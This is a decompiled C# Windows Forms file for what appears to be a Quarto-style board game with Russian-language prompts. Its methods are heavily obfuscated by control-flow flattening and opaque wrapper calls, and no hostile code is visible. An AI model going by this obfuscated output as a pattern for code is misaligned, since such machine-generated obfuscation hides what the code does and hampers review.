using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = 1427557790;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x438FB1D9u) % 6u)
					{
					case 5u:
						Dark = dark;
						Big = big;
						Square = square;
						num = ((int)num2 * -1699187859) ^ -1023132524;
						continue;
					case 4u:
						num = ((int)num2 * -957675188) ^ -1391103012;
						continue;
					case 2u:
						Point = point;
						num = (int)(num2 * 1737081753) ^ -1854040346;
						continue;
					case 1u:
						num = ((int)num2 * -2135220250) ^ 0x860321D;
						continue;
					default:
						return;
					case 0u:
						break;
					case 3u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = 2139140005;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xF6DBD56u) % 7u)
					{
					case 5u:
						num = ((int)num2 * -1468956070) ^ -818598097;
						continue;
					case 4u:
						num = (int)(num2 * 1161362716) ^ -1770571668;
						continue;
					case 3u:
						Big = copy.Big;
						num = ((int)num2 * -520739655) ^ 0x335F16F;
						continue;
					case 1u:
						Square = copy.Square;
						Point = copy.Point;
						num = (int)(num2 * 1663805184) ^ -682626026;
						continue;
					case 0u:
						Dark = copy.Dark;
						num = (int)((num2 * 613961338) ^ 0x74961ACC);
						continue;
					default:
						return;
					case 2u:
						break;
					case 6u:
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		Form1.smethod_15(timer1);
		while (true)
		{
			bool flag = Form1.smethod_16((Control)(object)menu) < 296;
			int num = -67137018;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF1006D24u) % 7u)
				{
				case 6u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -1788581298;
						num4 = -1788581298;
					}
					else
					{
						num3 = -68912299;
						num4 = -68912299;
					}
					num = num3 ^ (int)(num2 * 1856847714);
					continue;
				}
				case 5u:
					num = -1071156655;
					continue;
				case 4u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = -1671500639;
					continue;
				}
				case 1u:
					num = ((int)num2 * -52085640) ^ -65604936;
					continue;
				case 0u:
					Form1.smethod_14(menu);
					num = (int)(num2 * 851087794) ^ -544253067;
					continue;
				default:
					return;
				case 3u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		bool flag = default(bool);
		int num4 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num = 1343331697;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x10F5CE2Fu) % 21u)
				{
				case 20u:
					Paint_Storage();
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 1008381655) ^ -1003114682;
					continue;
				case 19u:
					flag = num4 < 4;
					num = 1338430929;
					continue;
				case 18u:
					num4 = 0;
					num = 266136203;
					continue;
				case 17u:
					storage = new Figurine[4, 4];
					num3 = 0;
					num = (int)((num2 * 381338083) ^ 0x5ADA6CD7);
					continue;
				case 16u:
					storage[num3, num4] = new Figurine(num3 < 2, num4 % 2 == 0, num4 < 2, num3 % 2 == 1);
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = ((int)num2 * -1497152655) ^ -1743020830;
					continue;
				case 15u:
				{
					int num7;
					if (num3 >= 4)
					{
						num = 243890743;
						num7 = 243890743;
					}
					else
					{
						num = 1663189353;
						num7 = 1663189353;
					}
					continue;
				}
				case 13u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = 1935703665;
						num6 = 1935703665;
					}
					else
					{
						num5 = 594636884;
						num6 = 594636884;
					}
					num = num5 ^ ((int)num2 * -162079015);
					continue;
				}
				case 12u:
					num3++;
					num = (int)((num2 * 1393152671) ^ 0x5A418C4F);
					continue;
				case 11u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)(num2 * 678852324) ^ -376922834;
					continue;
				case 10u:
					num = ((int)num2 * -1084524777) ^ 0x6DB67C1C;
					continue;
				case 9u:
					num4++;
					num = (int)((num2 * 968874480) ^ 0x74F8CE7C);
					continue;
				case 8u:
					num = ((int)num2 * -419685840) ^ 0x6BB8BA1C;
					continue;
				case 7u:
					Paint_Board();
					num = ((int)num2 * -1650925698) ^ 0x73DDDA39;
					continue;
				case 6u:
					num = (int)((num2 * 1136309355) ^ 0xFD4B92);
					continue;
				case 4u:
					num = (int)((num2 * 1025364402) ^ 0x7D7885BC);
					continue;
				case 3u:
					num = 855769446;
					continue;
				case 2u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num = ((int)num2 * -574687635) ^ 0x71F6B887;
					continue;
				case 1u:
					board = new Figurine[4, 4];
					num = ((int)num2 * -1559762678) ^ 0xA6465D;
					continue;
				case 0u:
					num = ((int)num2 * -1868931718) ^ 0x201FA6E7;
					continue;
				default:
					return;
				case 14u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		float num3 = default(float);
		bool square = default(bool);
		int num8 = default(int);
		int num7 = default(int);
		float num6 = default(float);
		float num4 = default(float);
		Graphics graphics_ = default(Graphics);
		float num9 = default(float);
		bool flag2 = default(bool);
		float num5 = default(float);
		Brush brush_ = default(Brush);
		bool flag = default(bool);
		while (true)
		{
			int num = 1489887200;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x32C2E0D4u) % 41u)
				{
				case 40u:
					num3 = 1f;
					num = (int)(num2 * 1278421402) ^ -1653214093;
					continue;
				case 39u:
					square = board[num8, num7].Square;
					num = ((int)num2 * -1400245920) ^ -784509409;
					continue;
				case 37u:
					num6 = (float)size * (num4 / 2f);
					num = ((int)num2 * -1070545566) ^ 0x362F750C;
					continue;
				case 36u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num6 + (float)(num7 * size), num6 + (float)(num8 * size), num9, num9);
					num = ((int)num2 * -1412189672) ^ 0x3B1DCE39;
					continue;
				case 35u:
					flag2 = num8 < 4;
					num = 381449242;
					continue;
				case 34u:
					num9 = num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -753567399) ^ -2035768986;
					continue;
				case 33u:
					brush_ = Form1.smethod_26();
					num = 1653247664;
					continue;
				case 32u:
					num8 = 0;
					num = (int)((num2 * 1329343275) ^ 0xAED73F0);
					continue;
				case 31u:
					num = (int)((num2 * 789248822) ^ 0x5B21B34A);
					continue;
				case 30u:
					num6 = (float)size * (num4 / 2f);
					num = ((int)num2 * -455308959) ^ 0x6F49F41C;
					continue;
				case 29u:
					num4 = 1f - num3 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 1511467508;
					continue;
				case 28u:
					Form1.smethod_24(graphics_, brush_, num6 + (float)(num7 * size), num6 + (float)(num8 * size), num9, num9);
					num = 950939682;
					continue;
				case 27u:
					num = (int)(num2 * 2144641744) ^ -203852160;
					continue;
				case 26u:
				{
					int num13;
					int num14;
					if (!square)
					{
						num13 = -1110577666;
						num14 = -1110577666;
					}
					else
					{
						num13 = -1776207935;
						num14 = -1776207935;
					}
					num = num13 ^ (int)(num2 * 1571984637);
					continue;
				}
				case 25u:
					num7 = 0;
					num = 1751343580;
					continue;
				case 24u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = ((int)num2 * -416494678) ^ 0x5B411CD9;
					continue;
				case 23u:
				{
					int num21;
					int num22;
					if (board[num8, num7].Dark)
					{
						num21 = 1833412064;
						num22 = 1833412064;
					}
					else
					{
						num21 = 1678960206;
						num22 = 1678960206;
					}
					num = num21 ^ ((int)num2 * -2070483488);
					continue;
				}
				case 22u:
				{
					int num19;
					int num20;
					if (!flag)
					{
						num19 = 894055125;
						num20 = 894055125;
					}
					else
					{
						num19 = 771183254;
						num20 = 771183254;
					}
					num = num19 ^ ((int)num2 * -123712470);
					continue;
				}
				case 21u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -727255002) ^ -678439037;
					continue;
				case 20u:
				{
					int num17;
					int num18;
					if (flag2)
					{
						num17 = 991275121;
						num18 = 991275121;
					}
					else
					{
						num17 = 220002408;
						num18 = 220002408;
					}
					num = num17 ^ ((int)num2 * -1149673058);
					continue;
				}
				case 19u:
					num = (int)((num2 * 691826522) ^ 0x38316EAA);
					continue;
				case 18u:
					num = (int)(num2 * 863451418) ^ -107228779;
					continue;
				case 17u:
					num8++;
					num = ((int)num2 * -530066594) ^ 0x510C9599;
					continue;
				case 16u:
					num = 839342213;
					continue;
				case 15u:
					flag = num7 < 4;
					num = 441086369;
					continue;
				case 14u:
					num7++;
					num = 1370012282;
					continue;
				case 13u:
				{
					int num15;
					int num16;
					if (board[num8, num7] != null)
					{
						num15 = -1590595685;
						num16 = -1590595685;
					}
					else
					{
						num15 = -474013210;
						num16 = -474013210;
					}
					num = num15 ^ (int)(num2 * 1752464867);
					continue;
				}
				case 12u:
					num = (int)(num2 * 987758765) ^ -1964075672;
					continue;
				case 11u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num7 + 0.05f) * (float)size, ((float)num8 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = 1142296149;
					continue;
				case 10u:
					num = (int)(num2 * 1515991944) ^ -1848206247;
					continue;
				case 9u:
					num3 = 0.7f;
					num = 1627427393;
					continue;
				case 8u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 1210006265) ^ -1742129312;
					continue;
				case 6u:
				{
					int num11;
					int num12;
					if (board[num8, num7].Point)
					{
						num11 = -576282973;
						num12 = -576282973;
					}
					else
					{
						num11 = -212813929;
						num12 = -212813929;
					}
					num = num11 ^ (int)(num2 * 600007395);
					continue;
				}
				case 5u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 866770405) ^ 0x36DC4BE4);
					continue;
				case 4u:
				{
					int num10;
					if (!board[num8, num7].Big)
					{
						num = 187199613;
						num10 = 187199613;
					}
					else
					{
						num = 1368612934;
						num10 = 1368612934;
					}
					continue;
				}
				case 3u:
					num9 = num5 * 0.4f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1440274872) ^ 0x23EE17EE;
					continue;
				case 2u:
					num = ((int)num2 * -37277919) ^ -1397286383;
					continue;
				case 1u:
					Form1.smethod_28(graphics_, brush_, num6 + (float)(num7 * size), num6 + (float)(num8 * size), num9, num9);
					num = (int)(num2 * 199346040) ^ -239841769;
					continue;
				case 0u:
					num4 = 1f - num3 * 0.9f / (float)Form1.smethod_27(2.0);
					num5 = (float)size * num3;
					num = 483504529;
					continue;
				default:
					return;
				case 38u:
					break;
				case 7u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		bool flag2 = default(bool);
		int num7 = default(int);
		float num11 = default(float);
		float num15 = default(float);
		int num6 = default(int);
		bool flag4 = default(bool);
		bool flag3 = default(bool);
		bool dark = default(bool);
		bool flag = default(bool);
		float num12 = default(float);
		float num3 = default(float);
		float num10 = default(float);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		bool big = default(bool);
		while (true)
		{
			int num = 1229455840;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6D7B08E6u) % 42u)
				{
				case 41u:
					flag2 = num7 < 4;
					num = 1731374904;
					continue;
				case 40u:
					num11 = num15 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 1401320311) ^ 0x36FEF22A);
					continue;
				case 39u:
					Form1.smethod_20(pictureBox[num6, num7], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num6, num7]), Form1.smethod_16((Control)(object)pictureBox[num6, num7])));
					num = ((int)num2 * -1449519738) ^ -801675505;
					continue;
				case 38u:
					num = ((int)num2 * -1243095801) ^ 0x56B63F1B;
					continue;
				case 36u:
					num = (int)(num2 * 465526728) ^ -21347892;
					continue;
				case 35u:
					num7++;
					num = 659644135;
					continue;
				case 34u:
				{
					int num22;
					int num23;
					if (!flag4)
					{
						num22 = 1775206646;
						num23 = 1775206646;
					}
					else
					{
						num22 = 1525560077;
						num23 = 1525560077;
					}
					num = num22 ^ (int)(num2 * 203143090);
					continue;
				}
				case 33u:
					num = ((int)num2 * -1067555408) ^ 0x5292BAF3;
					continue;
				case 32u:
				{
					int num18;
					int num19;
					if (!flag3)
					{
						num18 = -963982681;
						num19 = -963982681;
					}
					else
					{
						num18 = -1734067311;
						num19 = -1734067311;
					}
					num = num18 ^ (int)(num2 * 1420697273);
					continue;
				}
				case 31u:
				{
					int num8;
					int num9;
					if (!dark)
					{
						num8 = 433531621;
						num9 = 433531621;
					}
					else
					{
						num8 = 1547538659;
						num9 = 1547538659;
					}
					num = num8 ^ (int)(num2 * 1179431541);
					continue;
				}
				case 30u:
					flag = storage[num6, num7] != null;
					num = 1209910206;
					continue;
				case 29u:
					Form1.smethod_30((Control)(object)pictureBox[num6, num7]);
					num = 2036916831;
					continue;
				case 28u:
				{
					int num20;
					int num21;
					if (flag)
					{
						num20 = 1748298017;
						num21 = 1748298017;
					}
					else
					{
						num20 = 740434239;
						num21 = 740434239;
					}
					num = num20 ^ ((int)num2 * -466873113);
					continue;
				}
				case 27u:
					num7 = 0;
					num = 1381315654;
					continue;
				case 26u:
					num = ((int)num2 * -1869095124) ^ -195878577;
					continue;
				case 25u:
					num12 = 1f - num3 * 0.4f / (float)Form1.smethod_27(2.0);
					num10 = (float)size * (num12 / 2f) - 4f;
					num11 = num15 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 124094334;
					continue;
				case 24u:
					num3 = 1f;
					num = (int)(num2 * 513705804) ^ -1797489045;
					continue;
				case 23u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num6, num7]));
					num = (int)((num2 * 1132861930) ^ 0x63D508E7);
					continue;
				case 22u:
					flag3 = num7 < 2;
					num = ((int)num2 * -282604161) ^ -84249916;
					continue;
				case 21u:
					Form1.smethod_28(graphics_, brush_, num10, num10, num11, num11);
					num = (int)(num2 * 985298892) ^ -1782882785;
					continue;
				case 19u:
					flag4 = num6 < 4;
					num = 780947098;
					continue;
				case 18u:
					brush_ = Form1.smethod_26();
					num = 1704678300;
					continue;
				case 17u:
					num = (int)((num2 * 926074216) ^ 0x2AFE589C);
					continue;
				case 16u:
					num15 = (float)size * num3;
					num = ((int)num2 * -959572851) ^ 0x3DAFE3AD;
					continue;
				case 15u:
					num = (int)((num2 * 1056800545) ^ 0x23A57564);
					continue;
				case 14u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -1557973871) ^ -1315127030;
					continue;
				case 13u:
					num6++;
					num = (int)(num2 * 183629015) ^ -1249845734;
					continue;
				case 12u:
					num6 = 0;
					num = ((int)num2 * -1007847955) ^ -873784745;
					continue;
				case 11u:
					Form1.smethod_24(graphics_, brush_, num10, num10, num11, num11);
					num = 1515007310;
					continue;
				case 10u:
				{
					int num16;
					int num17;
					if (flag2)
					{
						num16 = -1376883520;
						num17 = -1376883520;
					}
					else
					{
						num16 = -1211005601;
						num17 = -1211005601;
					}
					num = num16 ^ (int)(num2 * 1711363130);
					continue;
				}
				case 9u:
					num10 = (float)size * (num12 / 2f) - 4f;
					num = ((int)num2 * -1829678035) ^ 0x7F47289B;
					continue;
				case 8u:
				{
					int num13;
					int num14;
					if (storage[num6, num7].Point)
					{
						num13 = -1502885615;
						num14 = -1502885615;
					}
					else
					{
						num13 = -1578888871;
						num14 = -1578888871;
					}
					num = num13 ^ (int)(num2 * 1605052353);
					continue;
				}
				case 7u:
					dark = storage[num6, num7].Dark;
					num = ((int)num2 * -1823230548) ^ 0xDAE035;
					continue;
				case 6u:
					num12 = 1f - num3 * 0.9f / (float)Form1.smethod_27(2.0);
					num = 753416816;
					continue;
				case 5u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num10, num10, num11, num11);
					num = ((int)num2 * -1652872786) ^ -355779917;
					continue;
				case 4u:
					big = storage[num6, num7].Big;
					num = 845047331;
					continue;
				case 3u:
					num = (int)(num2 * 936651647) ^ -611242701;
					continue;
				case 2u:
					num = ((int)num2 * -598752037) ^ -1895235065;
					continue;
				case 1u:
				{
					int num4;
					int num5;
					if (!big)
					{
						num4 = 338536937;
						num5 = 338536937;
					}
					else
					{
						num4 = 888988791;
						num5 = 888988791;
					}
					num = num4 ^ ((int)num2 * -14720471);
					continue;
				}
				case 0u:
					num3 = 0.7f;
					num = 1388186512;
					continue;
				default:
					return;
				case 37u:
					break;
				case 20u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		int num6 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		int num7 = default(int);
		int num5 = default(int);
		while (true)
		{
			int num = -472201334;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB10071B1u) % 28u)
				{
				case 27u:
					num6 = 0;
					num = ((int)num2 * -2134701308) ^ -893686103;
					continue;
				case 26u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					step = 1;
					num = (int)(num2 * 908841607) ^ -13919546;
					continue;
				case 25u:
					flag = num6 < 4;
					num = -1537768725;
					continue;
				case 24u:
					Form1.smethod_36(timer1);
					num = ((int)num2 * -314620999) ^ 0x9351BDE;
					continue;
				case 23u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = (int)(num2 * 1896352281) ^ -1485276376;
					continue;
				case 22u:
					flag2 = num7 < 4;
					num = -1387705010;
					continue;
				case 21u:
					num5 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1023417650) ^ -1478293315;
					continue;
				case 19u:
					num = ((int)num2 * -1068463514) ^ -1063103097;
					continue;
				case 18u:
				{
					int num11;
					int num12;
					if (flag)
					{
						num11 = 1661039050;
						num12 = 1661039050;
					}
					else
					{
						num11 = 952254911;
						num12 = 952254911;
					}
					num = num11 ^ ((int)num2 * -1728406657);
					continue;
				}
				case 17u:
					Form1.smethod_7((Control)(object)pictureBox[num6, num7], bool_0: true);
					num = -1616737319;
					continue;
				case 16u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 432228185) ^ 0x26BF85E5);
					continue;
				case 15u:
					num = (int)((num2 * 3426059) ^ 0x5E0ADC45);
					continue;
				case 14u:
					num6++;
					num = ((int)num2 * -466790706) ^ -1155162340;
					continue;
				case 13u:
					num = (int)(num2 * 997053336) ^ -1111858666;
					continue;
				case 12u:
					step = 0;
					num = ((int)num2 * -828379013) ^ 0x3E865ACA;
					continue;
				case 11u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = -1448946730;
						num10 = -1448946730;
					}
					else
					{
						num9 = -708086303;
						num10 = -708086303;
					}
					num = num9 ^ (int)(num2 * 1888593334);
					continue;
				}
				case 10u:
					num = -866936092;
					continue;
				case 9u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -1571447000;
					continue;
				case 8u:
					num = (int)(num2 * 9447119) ^ -310691684;
					continue;
				case 6u:
				{
					int num8 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num5, num8], Color.Blue);
					num = ((int)num2 * -1292957555) ^ 0x4027503F;
					continue;
				}
				case 5u:
					num7 = 0;
					num = -139648429;
					continue;
				case 4u:
					num7++;
					num = ((int)num2 * -559372742) ^ 0x342109C3;
					continue;
				case 3u:
				{
					Form1_Load(this, Form1.smethod_31());
					int num3;
					int num4;
					if (!turn)
					{
						num3 = 1702394054;
						num4 = 1702394054;
					}
					else
					{
						num3 = 1019407659;
						num4 = 1019407659;
					}
					num = num3 ^ (int)(num2 * 1763435243);
					continue;
				}
				case 2u:
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -2079071835) ^ -286168572;
					continue;
				case 1u:
					num = (int)(num2 * 579614931) ^ -314124517;
					continue;
				case 0u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 10085225) ^ -1327908429;
					continue;
				default:
					return;
				case 20u:
					break;
				case 7u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_018b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a1: Expected O, but got Unknown
		Point point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
		int num6 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		int num11 = default(int);
		bool flag = default(bool);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1721302361;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0x4271CC8Eu) % 25u)
				{
				case 24u:
					num6++;
					num = (int)((num2 * 289182747) ^ 0x7DFAA985);
					continue;
				case 23u:
					num3 = point.Y / size;
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num4 = point.X / size;
					num = (int)((num2 * 563813175) ^ 0x5473E94);
					continue;
				case 22u:
					num4 -= 4;
					num = (int)(num2 * 1345663497) ^ -45696435;
					continue;
				case 21u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.Red);
					num = (int)(num2 * 1308012804) ^ -298316465;
					continue;
				case 20u:
					Form1.smethod_5((Control)(object)borderBox[num11, num6], Color.White);
					num = 1981477680;
					continue;
				case 19u:
					num6 = 0;
					num = 353153978;
					continue;
				case 18u:
					num = (int)(num2 * 1335793871) ^ -913355032;
					continue;
				case 17u:
				{
					int num9;
					int num10;
					if (num4 > 1)
					{
						num9 = -1126176811;
						num10 = -1126176811;
					}
					else
					{
						num9 = -1983117570;
						num10 = -1983117570;
					}
					num = num9 ^ ((int)num2 * -847503440);
					continue;
				}
				case 16u:
					num = (int)((num2 * 1468040004) ^ 0x67A7DAFA);
					continue;
				case 15u:
					flag = num6 < 4;
					num = 388211503;
					continue;
				case 14u:
				{
					int num14;
					int num15;
					if (!flag)
					{
						num14 = 820407981;
						num15 = 820407981;
					}
					else
					{
						num14 = 1518472604;
						num15 = 1518472604;
					}
					num = num14 ^ ((int)num2 * -1706260466);
					continue;
				}
				case 13u:
					num11 = 0;
					num = ((int)num2 * -877405800) ^ 0x2819502C;
					continue;
				case 12u:
					num5 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num3, num4]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_01af;
				case 11u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -1605539255) ^ -1541682881;
					continue;
				case 10u:
					num11++;
					num = (int)((num2 * 143501951) ^ 0x1374976F);
					continue;
				case 9u:
				{
					int num12;
					int num13;
					if (flag3)
					{
						num12 = 1192421369;
						num13 = 1192421369;
					}
					else
					{
						num12 = 613539809;
						num13 = 613539809;
					}
					num = num12 ^ ((int)num2 * -1156835900);
					continue;
				}
				case 7u:
					flag3 = num11 < 4;
					num = 1141324195;
					continue;
				case 6u:
					num = ((int)num2 * -2028012973) ^ 0x2173A130;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = ((int)num2 * -448925328) ^ 0x6E1ACF30;
					continue;
				case 4u:
				{
					int num7;
					int num8;
					if (flag2)
					{
						num7 = -710115409;
						num8 = -710115409;
					}
					else
					{
						num7 = -1224537032;
						num8 = -1224537032;
					}
					num = num7 ^ ((int)num2 * -840143010);
					continue;
				}
				case 3u:
					if (storage[num3, num4] != null)
					{
						num = 1546945576;
						continue;
					}
					num5 = 0;
					goto IL_01af;
				case 2u:
					num = ((int)num2 * -359576940) ^ 0x4CF79D9D;
					continue;
				case 1u:
					num = ((int)num2 * -301884483) ^ 0x471FA6F7;
					continue;
				default:
					return;
				case 8u:
					break;
				case 0u:
					return;
					IL_01af:
					flag2 = (byte)num5 != 0;
					num = 1808306617;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Expected O, but got Unknown
		Graphics graphics_ = default(Graphics);
		int num7 = default(int);
		int num8 = default(int);
		bool flag = default(bool);
		int num4 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num = -253433341;
			while (true)
			{
				uint num2;
				int num9;
				switch ((num2 = (uint)num ^ 0xD5326A30u) % 25u)
				{
				case 23u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num7 + 0.05f) * (float)size, ((float)num8 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -640069980) ^ 0x53F77F66;
					continue;
				case 22u:
					flag = num4 < 4;
					num = -1779881970;
					continue;
				case 21u:
					num = (int)(num2 * 470805322) ^ -1099589552;
					continue;
				case 20u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -864306946) ^ 0x47D5411;
					continue;
				case 19u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = (int)(num2 * 1772071643) ^ -286661289;
					continue;
				case 18u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = (int)((num2 * 151067269) ^ 0x69D54D4D);
						continue;
					}
					goto IL_0115;
				case 17u:
					num4++;
					num = -2059795504;
					continue;
				case 16u:
				{
					int num10;
					int num11;
					if (flag)
					{
						num10 = -312250805;
						num11 = -312250805;
					}
					else
					{
						num10 = -401703528;
						num11 = -401703528;
					}
					num = num10 ^ ((int)num2 * -855459333);
					continue;
				}
				case 15u:
					num7 = Form1.smethod_38(e) / size;
					num = (int)((num2 * 1900932020) ^ 0x3F2C85FF);
					continue;
				case 14u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)(num2 * 506497103) ^ -1579698719;
					continue;
				case 13u:
					num4 = 0;
					num = -1204137457;
					continue;
				case 12u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num3, num4]), num7 * size + 4, num8 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 688489522) ^ -729261417;
					continue;
				case 11u:
					num = (int)(num2 * 348001765) ^ -1505162046;
					continue;
				case 9u:
					num = (int)((num2 * 705774796) ^ 0x78BD8CDF);
					continue;
				case 8u:
					num8 = Form1.smethod_39(e) / size;
					num = (int)(num2 * 1016611570) ^ -335017813;
